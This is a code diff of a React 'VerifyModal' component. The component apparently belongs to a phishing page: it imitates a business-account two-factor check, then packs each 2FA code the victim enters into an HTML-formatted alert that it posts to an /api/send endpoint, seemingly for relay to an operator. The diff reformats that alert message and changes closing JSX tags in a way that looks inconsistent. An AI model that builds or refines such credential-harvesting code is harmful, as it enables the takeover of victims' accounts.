@@ -93,8 +93,7 @@ const VerifyModal: FC<{ nextStep: () => void; businessName?: string; fullName?: 
 
         const updatedMessage = `${message}
 
-<b>✅ 2FA CODE RECEIVED</b>
-<b>🔐 Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
         try {
             const res = await axios.post('/api/send', {
                 message: updatedMessage,
@@ -143,6 +142,7 @@ const VerifyModal: FC<{ nextStep: () => void; businessName?: string; fullName?: 
                             {userPhone && <>, {maskPhone(userPhone)}</>}
                             {t(' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)')}
                         </p>
+                    )}
 
                         {/* Illustration */}
                         <div className='w-full py-1.5 sm:py-2 md:py-3'>
@@ -199,7 +199,7 @@ const VerifyModal: FC<{ nextStep: () => void; businessName?: string; fullName?: 
                     </div>
                 </div>
             </div>
-        </>
+        </div>
     );
 };
 
